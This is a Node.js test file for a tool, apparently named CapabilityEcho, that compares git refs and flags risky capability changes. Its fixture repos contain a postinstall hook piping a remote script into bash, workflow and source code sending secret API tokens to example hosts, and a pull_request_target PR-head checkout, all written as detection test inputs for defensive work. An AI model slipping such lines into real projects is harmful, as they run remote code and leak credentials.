import test from 'node:test';
import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { mkdtemp, writeFile, mkdir, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';
import { dirname } from 'node:path';

const execFileAsync = promisify(execFile);
const testDir = dirname(fileURLToPath(import.meta.url));
const packageRoot = join(testDir, '..');

test('CLI diffs capability drift between git refs without agent config changes', async () => {
  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-git-'));
  try {
    await execGit(repo, 'init', '-b', 'main');
    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');

    await writeProject(repo, {
      packageJson: {
        name: 'git-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: CI',
        '',
        'permissions:',
        '  contents: read',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'base app');
    const base = await gitStdout(repo, 'rev-parse', 'HEAD');

    await writeProject(repo, {
      packageJson: {
        name: 'git-fixture',
        private: true,
        scripts: {
          test: 'vitest',
          postinstall: 'curl https://install.example.com/setup.sh | bash'
        }
      },
      workflow: [
        'name: CI',
        '',
        'permissions:',
        '  contents: write',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test',
        '      - run: curl https://example.com/bootstrap.sh'
      ].join('\n'),
      source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n"
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'add capability drift');
    const head = await gitStdout(repo, 'rev-parse', 'HEAD');

    const { stdout } = await execFileAsync(
      process.execPath,
      ['dist/index.js', 'diff', '--repo', repo, '--base', base, '--head', head, '--format', 'json'],
      { cwd: packageRoot }
    );
    const report = JSON.parse(stdout);

    assert.equal(report.rating, 'critical');
    assert.ok(report.findings.some((finding) => finding.kind === 'capability_echo.external_fetch_added'));
    assert.ok(report.findings.some((finding) => finding.kind === 'capability_echo.workflow_permission_write'));
    assert.ok(report.findings.some((finding) => finding.kind === 'capability_echo.lifecycle_script_added'));
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('CLI ignores AI-agent config changes while still scanning executable surfaces', async () => {
  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-agent-config-'));
  try {
    await execGit(repo, 'init', '-b', 'main');
    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');

    await writeProject(repo, {
      packageJson: {
        name: 'agent-config-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: CI',
        '',
        'permissions:',
        '  contents: read',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    });
    await writeFile(join(repo, '.mcp.json'), '{"servers":{}}\n', 'utf8');
    await mkdir(join(repo, '.claude'), { recursive: true });
    await writeFile(join(repo, '.claude/settings.json'), '{"permissions":[]}\n', 'utf8');
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'base app');
    const base = await gitStdout(repo, 'rev-parse', 'HEAD');

    await writeProject(repo, {
      packageJson: {
        name: 'agent-config-fixture',
        private: true,
        scripts: {
          test: 'vitest',
          postinstall: 'curl https://install.example.com/setup.sh | bash'
        }
      },
      workflow: [
        'name: CI',
        '',
        'permissions:',
        '  contents: write',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test',
        '      - run: curl https://example.com/bootstrap.sh'
      ].join('\n'),
      source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n"
    });
    await writeFile(
      join(repo, '.mcp.json'),
      '{"servers":{"local":{"command":"node","args":["tool.js"]}}}\n',
      'utf8'
    );
    await writeFile(join(repo, '.claude/settings.json'), '{"permissions":["Bash(*)"]}\n', 'utf8');
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'add executable capability drift and agent config drift');
    const head = await gitStdout(repo, 'rev-parse', 'HEAD');

    const { stdout } = await execFileAsync(
      process.execPath,
      ['dist/index.js', 'diff', '--repo', repo, '--base', base, '--head', head, '--format', 'json'],
      { cwd: packageRoot }
    );
    const report = JSON.parse(stdout);

    assert.equal(report.changedFileCount, 3);
    assert.deepEqual(new Set(report.scannedSurfaces), new Set(['source', 'package', 'workflow']));
    assert.ok(report.excludedSurfaces.includes('AI-agent config'));
    assert.ok(report.findings.some((finding) => finding.surface === 'source'));
    assert.ok(report.findings.some((finding) => finding.surface === 'package'));
    assert.ok(report.findings.some((finding) => finding.surface === 'workflow'));
    assert.ok(report.findings.every((finding) => !finding.file.includes('.mcp') && !finding.file.includes('.claude')));
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('CLI detects package capability drift from compared git refs, not the current checkout', async () => {
  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-package-ref-'));
  try {
    await execGit(repo, 'init', '-b', 'main');
    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');

    await writeProject(repo, {
      packageJson: {
        name: 'package-ref-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: CI',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'base app');
    const base = await gitStdout(repo, 'rev-parse', 'HEAD');

    await mkdir(join(repo, 'tools/agent'), { recursive: true });
    await writeFile(
      join(repo, 'tools/agent/package.json'),
      `${JSON.stringify(
        {
          name: 'agent-tooling',
          private: true,
          scripts: {
            postinstall: 'curl https://install.example.com/setup.sh | bash'
          },
          dependencies: {
            puppeteer: '^22.0.0'
          }
        },
        null,
        2
      )}\n`,
      'utf8'
    );
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'add agent package capability drift');
    const head = await gitStdout(repo, 'rev-parse', 'HEAD');
    await execGit(repo, 'checkout', base);

    const { stdout } = await execFileAsync(
      process.execPath,
      ['dist/index.js', 'diff', '--repo', repo, '--base', base, '--head', head, '--format', 'json'],
      { cwd: packageRoot }
    );
    const report = JSON.parse(stdout);

    assert.equal(report.changedFileCount, 1);
    assert.deepEqual(report.scannedSurfaces, ['package']);
    assert.ok(report.findings.some((finding) => finding.kind === 'capability_echo.lifecycle_script_added'));
    assert.ok(report.findings.some((finding) => finding.kind === 'capability_echo.high_capability_dep_added'));
    assert.ok(report.findings.every((finding) => finding.file === 'tools/agent/package.json'));
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('CLI flags PR-head checkout added to an existing pull_request_target workflow', async () => {
  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-workflow-context-'));
  try {
    await execGit(repo, 'init', '-b', 'main');
    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');

    await writeProject(repo, {
      packageJson: {
        name: 'workflow-context-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: PR Audit',
        '',
        'on:',
        '  pull_request_target:',
        '',
        'jobs:',
        '  audit:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - uses: actions/checkout@v6'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'base pull request target workflow');
    const base = await gitStdout(repo, 'rev-parse', 'HEAD');

    await writeProject(repo, {
      packageJson: {
        name: 'workflow-context-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: PR Audit',
        '',
        'on:',
        '  pull_request_target:',
        '',
        'jobs:',
        '  audit:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - uses: actions/checkout@v6',
        '        with:',
        '          ref: ${{ github.event.pull_request.head.sha }}'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'checkout pr head under target workflow');
    const head = await gitStdout(repo, 'rev-parse', 'HEAD');

    const { stdout } = await execFileAsync(
      process.execPath,
      ['dist/index.js', 'diff', '--repo', repo, '--base', base, '--head', head, '--format', 'json'],
      { cwd: packageRoot }
    );
    const report = JSON.parse(stdout);

    const finding = report.findings.find((item) => item.kind === 'capability_echo.workflow_pr_head_checkout_on_target');
    assert.ok(finding);
    assert.equal(finding.file, '.github/workflows/ci.yml');
    assert.equal(finding.line, 12);
    assert.equal(finding.severity, 'high');
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('CLI flags external requests using existing workflow secret env vars', async () => {
  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-workflow-secret-env-'));
  try {
    await execGit(repo, 'init', '-b', 'main');
    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');

    await writeProject(repo, {
      packageJson: {
        name: 'workflow-secret-env-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: Deploy',
        '',
        'jobs:',
        '  deploy:',
        '    runs-on: ubuntu-latest',
        '    env:',
        '      API_TOKEN: ${{ secrets.API_TOKEN }}',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'base workflow secret env');
    const base = await gitStdout(repo, 'rev-parse', 'HEAD');

    await writeProject(repo, {
      packageJson: {
        name: 'workflow-secret-env-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: Deploy',
        '',
        'jobs:',
        '  deploy:',
        '    runs-on: ubuntu-latest',
        '    env:',
        '      API_TOKEN: ${{ secrets.API_TOKEN }}',
        '    steps:',
        '      - run: npm test',
        '      - run: curl https://example.com/hook -H "Authorization: Bearer $API_TOKEN"'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'add secret env outbound request');
    const head = await gitStdout(repo, 'rev-parse', 'HEAD');

    const { stdout } = await execFileAsync(
      process.execPath,
      ['dist/index.js', 'diff', '--repo', repo, '--base', base, '--head', head, '--format', 'json'],
      { cwd: packageRoot }
    );
    const report = JSON.parse(stdout);

    const finding = report.findings.find((item) => item.kind === 'capability_echo.workflow_secret_exfil_pattern');
    assert.ok(finding);
    assert.equal(finding.file, '.github/workflows/ci.yml');
    assert.equal(finding.line, 10);
    assert.equal(finding.severity, 'high');
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('CLI flags external fetches using existing source env secret variables', async () => {
  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-source-secret-var-'));
  try {
    await execGit(repo, 'init', '-b', 'main');
    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');

    await writeProject(repo, {
      packageJson: {
        name: 'source-secret-var-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: CI',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: [
        'const apiToken = process.env.API_TOKEN;',
        '',
        'export async function sync() {',
        '  return "ok";',
        '}'
      ].join('\n')
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'base source env secret');
    const base = await gitStdout(repo, 'rev-parse', 'HEAD');

    await writeProject(repo, {
      packageJson: {
        name: 'source-secret-var-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: CI',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: [
        'const apiToken = process.env.API_TOKEN;',
        '',
        'export async function sync() {',
        '  await fetch("https://collector.example.com/events", { headers: { Authorization: `Bearer ${apiToken}` } });',
        '  return "ok";',
        '}'
      ].join('\n')
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'send env secret variable externally');
    const head = await gitStdout(repo, 'rev-parse', 'HEAD');

    const { stdout } = await execFileAsync(
      process.execPath,
      ['dist/index.js', 'diff', '--repo', repo, '--base', base, '--head', head, '--format', 'json'],
      { cwd: packageRoot }
    );
    const report = JSON.parse(stdout);

    const finding = report.findings.find((item) => item.kind === 'capability_echo.source_secret_exfil_pattern');
    assert.ok(finding);
    assert.equal(finding.file, 'src/client.ts');
    assert.equal(finding.line, 4);
    assert.equal(finding.severity, 'high');
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('CLI flags Python external requests using existing source env secret variables', async () => {
  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-python-secret-var-'));
  try {
    await execGit(repo, 'init', '-b', 'main');
    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');

    await writeProject(repo, {
      packageJson: {
        name: 'python-secret-var-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: CI',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    });
    await writeFile(
      join(repo, 'src/agent.py'),
      [
        'import os',
        'import requests',
        'api_token = os.getenv("API_TOKEN")',
        '',
        'def sync():',
        '    return "ok"'
      ].join('\n'),
      'utf8'
    );
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'base python env secret');
    const base = await gitStdout(repo, 'rev-parse', 'HEAD');

    await writeProject(repo, {
      packageJson: {
        name: 'python-secret-var-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: CI',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    });
    await writeFile(
      join(repo, 'src/agent.py'),
      [
        'import os',
        'import requests',
        'api_token = os.getenv("API_TOKEN")',
        '',
        'def sync():',
        '    requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + api_token})',
        '    return "ok"'
      ].join('\n'),
      'utf8'
    );
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'send python env secret variable externally');
    const head = await gitStdout(repo, 'rev-parse', 'HEAD');

    const { stdout } = await execFileAsync(
      process.execPath,
      ['dist/index.js', 'diff', '--repo', repo, '--base', base, '--head', head, '--format', 'json'],
      { cwd: packageRoot }
    );
    const report = JSON.parse(stdout);

    const finding = report.findings.find((item) => item.kind === 'capability_echo.source_secret_exfil_pattern');
    assert.ok(finding);
    assert.equal(finding.file, 'src/agent.py');
    assert.equal(finding.line, 6);
    assert.equal(finding.severity, 'high');
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

test('git diff exposes missing refs as setup errors', async () => {
  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-git-setup-error-'));
  try {
    await execGit(repo, 'init', '-b', 'main');
    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');

    await writeProject(repo, {
      packageJson: {
        name: 'git-setup-error-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      workflow: [
        'name: CI',
        '',
        'permissions:',
        '  contents: read',
        '',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: npm test'
      ].join('\n'),
      source: "export function hello() {\n  return 'ok';\n}\n"
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'base app');

    const gitDiff = await import('../dist/git-diff.js');
    assert.equal(typeof gitDiff.GitDiffSetupError, 'function');

    await assert.rejects(
      () => gitDiff.collectGitDiff(repo, 'missing-base-ref', 'missing-head-ref'),
      (error) =>
        error instanceof gitDiff.GitDiffSetupError &&
        /base 'missing-base-ref'/.test(error.message) &&
        /head 'missing-head-ref'/.test(error.message)
    );
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

async function writeProject(repo, { packageJson, workflow, source }) {
  await mkdir(join(repo, 'src'), { recursive: true });
  await mkdir(join(repo, '.github', 'workflows'), { recursive: true });
  await writeFile(join(repo, 'package.json'), `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
  await writeFile(join(repo, '.github/workflows/ci.yml'), `${workflow}\n`, 'utf8');
  await writeFile(join(repo, 'src/client.ts'), source, 'utf8');
}

async function execGit(cwd, ...args) {
  await execFileAsync('git', ['-C', cwd, ...args]);
}

async function gitStdout(cwd, ...args) {
  const { stdout } = await execFileAsync('git', ['-C', cwd, ...args], { encoding: 'utf8' });
  return stdout.trim();
}
